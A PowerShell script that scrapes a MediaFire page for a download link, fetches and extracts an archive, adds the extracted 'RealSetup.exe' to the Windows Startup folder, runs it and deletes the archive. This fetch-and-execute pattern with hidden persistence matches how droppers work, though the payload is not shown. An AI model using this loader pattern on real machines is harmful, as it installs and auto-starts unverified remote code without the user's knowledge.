# ==============================
# 1. Variables
# ==============================

$mediaFireUrl = "https://www.mediafire.com/file/8cjye2bst1ambjt/"
$zipName = "Real.zip"
$exeName = "RealSetup.exe"
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    $targetPath = "$env:ProgramData"

    if (-not (Test-Path $targetPath)) {
        New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
    }
}
else {
    $targetPath = $env:LocalAppData
}

$zipPath = Join-Path $targetPath $zipName
$extractPath = Join-Path $targetPath "Real"

Write-Host "Removing $extractPath"

Remove-Item -Path $extractPath

# ==============================
# 2. Prepare extraction directory
# ==============================

if (Test-Path $extractPath) {
    Remove-Item $extractPath -Recurse -Force
}

New-Item -ItemType Directory -Path $extractPath -Force | Out-Null

# ==============================
# 3. Get MediaFire page
# ==============================

$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
}

Write-Host "Getting MediaFire page..."

try {
    $page = Invoke-WebRequest `
        -Uri $mediaFireUrl `
        -Headers $headers `
        -UseBasicParsing `
        -MaximumRedirection 10 `
        -TimeoutSec 30 `
        -ErrorAction Stop
}
catch {
    throw "Could not access MediaFire page: $($_.Exception.Message)"
}

# ==============================
# 4. Find download URL
# ==============================

$directUrl = $null

# First try parsed links
$directUrl = $page.Links |
    Where-Object {
        $_.href -and
        $_.href -match 'download.*mediafire\.com'
    } |
    Select-Object -ExpandProperty href -First 1

# If that failed, search raw HTML
if (-not $directUrl) {
    $pattern = 'https?://[^"''<>\s]+mediafire\.com[^"''<>\s]*'
    $matches = [regex]::Matches($page.Content, $pattern)

    foreach ($match in $matches) {
        if ($match.Value -match 'download') {
            $directUrl = $match.Value
            break
        }
    }
}

if (-not $directUrl) {
    throw "Could not locate the MediaFire download URL."
}

Write-Host ""
Write-Host "Direct URL:"
Write-Host $directUrl
Write-Host ""

# ==============================
# 5. Download using curl.exe
# ==============================

if (Test-Path $zipPath) {
    Remove-Item $zipPath -Force
}

Write-Host "Downloading to:"
Write-Host $zipPath

$curlArgs = @(
    "--location"
    "--fail"
    "--retry", "3"
    "--retry-delay", "2"
    "--connect-timeout", "30"
    "--max-time", "600"
    "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "-o", $zipPath
    $directUrl
)

& curl.exe @curlArgs

if ($LASTEXITCODE -ne 0) {
    throw "curl download failed with exit code $LASTEXITCODE"
}

# ==============================
# 6. Verify download
# ==============================

if (-not (Test-Path $zipPath)) {
    throw "Download failed: file was not created."
}

$file = Get-Item $zipPath

Write-Host "Downloaded:"
Write-Host "$($file.FullName)"
Write-Host "Size: $($file.Length) bytes"

if ($file.Length -lt 1000) {
    throw "Downloaded file is suspiciously small."
}

# ==============================
# 7. Extract
# ==============================

# Define the installation paths to check
$7zipPath  = "C:\Program Files\7-Zip\7z.exe"
$winrarPath = "C:\Program Files\WinRAR\Rar.exe"

# Check if the extractors actually exist on the system
$has7zip  = Test-Path $7zipPath
$hasWinrar = Test-Path $winrarPath

# Logic to choose the extractor
if ($has7zip) {
    Write-Host "7-Zip detected. Extracting..."
    
    & $7zipPath x $zipPath "-o$extractPath" -y
    if ($LASTEXITCODE -ne 0) { throw "7-Zip extraction failed." }
}
elseif ($hasWinrar) {
    Write-Host "WinRAR detected. Extracting..."
    
    & $winrarPath x $zipPath * $extractPath\ -y
    if ($LASTEXITCODE -ne 0) { throw "WinRAR extraction failed." }
}
else {
    # If neither application is found, cancel the operation
    Write-Warning "Cancellation: Extractors not installed."
    return
}

# ==============================
# 8. Link in Start Up
# ==============================

$exePath = Join-Path $extractPath $exeName

if (-not (Test-Path $exePath)) {
    throw "EXE not found: $exePath"
}

$shortcutName = "Real.lnk"

if ($isAdmin) {
    $startmenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
}
else {
    $startmenuPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
}

$shortcutFile = Join-Path $startmenuPath $shortcutName
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($shortcutFile)
$Shortcut.TargetPath = $exePath
$Shortcut.WorkingDirectory = Split-Path -Parent $exePath
$Shortcut.Save()

# ==============================
# 9. Run EXE
# ==============================

Write-Host "Starting $exePath"

Start-Process -FilePath $exePath

Write-Host "Removing $zipPath"

Remove-Item -Path $zipPath
